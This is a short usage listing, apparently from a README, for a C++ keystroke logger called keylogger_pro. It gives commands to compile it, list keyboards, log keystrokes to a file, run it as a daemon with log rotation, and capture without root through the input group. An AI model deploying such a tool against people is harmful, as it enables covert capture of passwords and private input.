# Build
g++ -O2 -std=c++17 -pthread -o keylogger_pro keylogger_pro.cpp

# List detected keyboards
sudo ./keylogger_pro --list

# Capture to file (foreground)
sudo ./keylogger_pro -o /var/log/keys.log

# Daemon mode, 20MB rotation, 3 backups
sudo ./keylogger_pro --daemon -o /var/log/keys.log --max-size 20 --backups 3

# Without root (add user to input group first)
sudo usermod -aG input $USER
newgrp input
./keylogger_pro -o keys.log